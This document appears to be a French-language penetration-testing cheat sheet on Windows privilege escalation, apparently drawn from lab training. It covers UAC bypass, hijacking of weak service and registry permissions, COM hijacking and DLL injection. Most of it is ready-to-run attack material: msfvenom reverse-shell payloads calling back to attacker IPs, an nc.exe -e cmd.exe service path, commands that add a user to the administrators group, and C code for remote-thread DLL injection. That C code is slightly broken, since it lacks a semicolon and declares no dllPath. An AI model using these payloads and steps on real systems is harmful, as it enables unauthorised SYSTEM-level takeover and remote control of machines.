
- [ ] [[#UAC Bypass]]
- [ ] [[#Services]]
- [ ] [[#Registry]]
- [ ] [[#DLL Injection]]


# UAC Bypass

> [!RAPPEL]
> Necessite de faire partie du groupe administrators local

https://github.com/hfiref0x/UACME

[[#Technique 54 (DLL Hijacking) (Win10 14393)]]
[[#Script Bypass-UAC (WIN7/10)]]

### 1. Confirmer que UAC est activé

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

### 2. Identifier le niveau d'UAC

0x5 = Always Notify

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

[[UAC BYPASSES]]

### 3. Identifier la version de l'OS

```powershell
 [environment]::OSVersion.Version
```

https://en.wikipedia.org/wiki/Windows_10_version_history


### 4. Rechercher une technique censée fonctionner

https://github.com/hfiref0x/UACME


## Technique 54 (DLL Hijacking) (Win10 14393)

### 1. Identifier la variable PATH

```powershell-session
cmd /c echo %PATH%
```


### 2. Créer une dll malveillante

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```


### 3. Transférer la dll sur la target et la mettre dans un dossier du path


### 4. Lancer listener

```bash
nc -lvnp 8443
```

### 5. Vérifier que rundll32 ne tourne pas

```cmd
tasklist /svc | findstr "rundll32"
```

```cmd
taskkill /PID 7044 /F
```

### 6. Exécuter le programme vulnérable appelant la DLL. (sensible à la casse)

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```




## Script Bypass-UAC (WIN7/10)

https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC

```powershell
Import-Module .\Bypass-UAC.ps1
```

```powershell
Bypass-UAC -Method UacMethodSysprep
```


---
# SERVICES

Tools:
[[SHARPUP (Services - Registre)]] (exe)
[[POWERUP (Services - Registre)]] (ps1 -> [[BYPASS AV - EDR#AMSI Bypass]])



- [ ] [[#Services Vulnérables]]
- [ ] [[#Weak Permissions]]
	- [ ] [[#Binaires de service modifiables]]
	- [ ] [[#Dossiers modifiables]]
	- [ ] [[#Fichiers modifiables]]
	- [ ] [[#Services modifiable]]
	- [ ] [[#Unquoted Service Path]]
	- [ ] [[#Droits sur le registre]]
	- [ ] [[#Autoruns modifiables]]



# Services Vulnérables

1. Identifier les applications installées

```cmd-session
wmic product get name
```

2. Chercher CVEs


# Weak Permissions

> [!TIP]
> Identifier les services lancés en tant qu'autre utilisateur


Gestion des ACLs avec icacls (natif) -> https://4sysops.com/archives/icacls-list-set-grant-remove-and-deny-permissions/#rtoc-8


### Identifier les weaks permissions avec SharpUp
https://github.com/GhostPack/SharpUp/

```powershell
.\SharpUp.exe audit
```


## Binaires de service modifiables

### 1. Vérifier les permissions sur le binaire

```powershell-session
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

### 2. Créer un binaire malveillant avec msfvenom

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f exe > SecurityService.exe
```

### 3. Transférer la charge et remplacer le binaire

```cmd-session
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

### 4. Lancer le service (cmd)

```cmd
sc start SecurityService
```



## Services modifiable


> [!Important]
> Bien noter le path avant afin de le remettre après exploitation

### AccessChk (SysinternalsSuite)

### 1. Vérifier les permissions sur le service avec AccessChk

```cmd-session
.\accesschk.exe /accepteula -quvcw WindscribeService
```

ou avec sc directement

```
cmd /c sc qc <service name>
```

### 2. Changer le path du service

Pointer vers commande cmd pour ajouter user au groupe administrators

```cmd-session
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

### 3. Arrêter et relancer le service

```cmd-session
sc stop WindscribeService
```

erreur normale puisqu'il ne trouve pas le path

```cmd-session
sc start WindscribeService
```

### 4. Confirmer l'ajout au groupe administrators

```cmd-session
net localgroup administrators
```

### 5. Remettre le path originale

```cmd-session
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### 6. Relancer le service

```cmd-session
sc start WindScribeService
```

```cmd-session
sc query WindScribeService
```


## Unquoted Service Path

> [!TIP]
> Si possible d'écrire dans un dossier du path qui contient un espace et pas d'apostrophe -> Placer une charge malveillante dans le dossier en question. 

### 1. Identifier les Unquoted Service Path

```cmd-session
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

```powershell
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
```


### 2. Voir si le service tourne en tant que SYSTEM

```
cmd /c sc qc <service name>
```


### 3. Verifier si possible d'écrire dans le path



### 4. Créer charge malveillante portant le nom du dossier parent

Exemple:
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`
- Si possible d'écrire dans System Explorer

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f exe > System.exe
```



## Droits sur le registre


## AccessChk (SysinternalsSuite)
### 1. Identifier les droits d'un user sur un service dans le registre

```cmd-session
accesschk.exe /accepteula "user" -kvuqsw hklm\System\CurrentControlSet\services
```

### 2. Changer la valeur d'image path sur la clé

```powershell-session
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```


## Autoruns modifiables

### 1. Identifier les autoruns

```powershell-session
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

Si possible d'écrire dans la location alors Hijacking de binaire

---
# Registry

### Autoruns

identifier autoruns.

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

vérifier droit sur le programme.

```
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

### COM Hijacking

Identifier si possible de modifier un CLSID

```
.\accesschk.exe /accepteula -uwkqvs "<User>" HKLM\Software\Classes
```

Si possible identifier le path de la DLL

```
reg query "HKLM\Software\Classes\...\InprocServer32"
```

Créer une dll malicieuse

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.177 LPORT=4444 -f dll -o 7zip.dll
```

Ajouter une entrée à la clé de registre pointant vers la DLL.

```
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Windows\Temp\7zip.dll" /f
```

Puis attendre que quelqu'un execute le programme/service associé.

---
# DLL Injection

- [[#LoadLibrary (API system) (flag)]]
- [[#Manual Mapping]]
- [[#Reflective DLL Injection]]
- [[DLL HIJACKING WINDOWS]]

## LoadLibrary (API system) (flag)

Permet de charger un DLL dans le processus actuel en mémoire de manière legitime

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```


Injection DLL en allouant de la mémoire au sein du processus cible pour le chemin d'accès à la DLL, puis en lançant un thread distant qui commence par LoadLibrary et se dirige vers le chemin d'accès à la DLL.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```

## Manual Mapping

1. Charger la DLL en tant que données brutes dans le processus d'injection.
2. Mettre en correspondance les sections de la DLL avec le processus ciblé.
3. Injecter un shellcode dans le processus cible et l'exécuter. Ce shellcode relocalise la DLL, rectifie les importations, exécute les callbacks du Thread Local Storage (TLS) et appelle finalement la DLL principale.

## Reflective DLL Injection

En supposant que le code soit exécuté dans le processus hôte et que la DLL que nous voulons injecter ait été écrite dans un emplacement de mémoire arbitraire dans le processus hôte, l'injection de DLL par réflexion fonctionne comme suit.

1. Le contrôle de l'exécution est transféré à la fonction ReflectiveLoader de la bibliothèque, une fonction exportée qui se trouve dans la table d'exportation de la bibliothèque. Cela peut se faire via CreateRemoteThread() ou un shellcode d'amorçage minimal.
2. Comme l'image de la bibliothèque réside actuellement dans un emplacement mémoire arbitraire, le ReflectiveLoader calcule d'abord l'emplacement mémoire actuel de sa propre image pour analyser ses propres en-têtes en vue d'une utilisation ultérieure.
3. Le ReflectiveLoader analyse ensuite la table d'exportation kernel32.dll du processus hôte pour calculer les adresses de trois fonctions nécessaires au chargeur, à savoir LoadLibraryA, GetProcAddress et VirtualAlloc.
4. Le ReflectiveLoader alloue maintenant une région de mémoire continue dans laquelle il chargera sa propre image. L'emplacement n'est pas crucial ; le chargeur relocalisera correctement l'image plus tard.
5. Les en-têtes et les sections de la bibliothèque sont chargés dans leurs nouveaux emplacements mémoire.
6. L'autochargeur réflexif traite ensuite la copie nouvellement chargée de la table d'importation de son image, en chargeant toutes les bibliothèques supplémentaires et en résolvant les adresses de leurs fonctions importées respectives.
7. L'autochargeur réflexif traite ensuite la copie nouvellement chargée de la table de relocalisation de son image.
8. L'autochargeur réflexif appelle ensuite la fonction de point d'entrée de son image nouvellement chargée, DllMain, avec DLL_PROCESS_ATTACH. La bibliothèque a maintenant été chargée avec succès dans la mémoire.
9. Enfin, le ReflectiveLoader renvoie l'exécution au shellcode d'amorçage initial qui l'a appelé ou, s'il a été appelé via CreateRemoteThread, le thread se termine".
